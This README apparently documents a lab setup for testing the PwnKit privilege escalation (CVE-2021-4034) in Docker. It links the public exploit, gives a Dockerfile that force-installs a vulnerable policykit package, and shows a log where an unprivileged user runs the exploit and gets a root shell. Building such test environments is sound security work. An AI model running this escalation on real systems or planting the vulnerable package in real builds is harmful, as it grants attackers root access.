# Test CVE-2021-4034 in a docker

## Original exploit
https://www.exploit-db.com/exploits/50689

## Links to deb files
https://launchpad.net/ubuntu/+source/policykit-1

## Setup

```bash
wget https://launchpad.net/ubuntu/+source/policykit-1/0.105-31/+build/21659401/+files/policykit-1_0.105-31_amd64.deb
```

## Dockerfile
```dockerfile
FROM ubuntu:jammy

RUN apt update
RUN apt install -y policykit-1
RUN adduser user
WORKDIR /home/user
ADD CVE2021-4034.tar.gz .

# install vulnerable deb file
ADD policykit-1_0.105-31_amd64.deb .
RUN dpkg --force-all -i policykit-1_0.105-31_amd64.deb

USER user
ENTRYPOINT [ "bash" ]
```

## Exploit
```
┌──(kali㉿kali)-[~/test/privescdock]
└─$ docker run --rm -it testpkexec
user@bc4803a951e9:~$ ls
Makefile  evil-so.c  evil.so  exploit  exploit.c  policykit-1_0.105-31_amd64.deb
user@bc4803a951e9:~$ ./exploit 
# id
uid=0(root) gid=0(root) groups=0(root)
#    
```

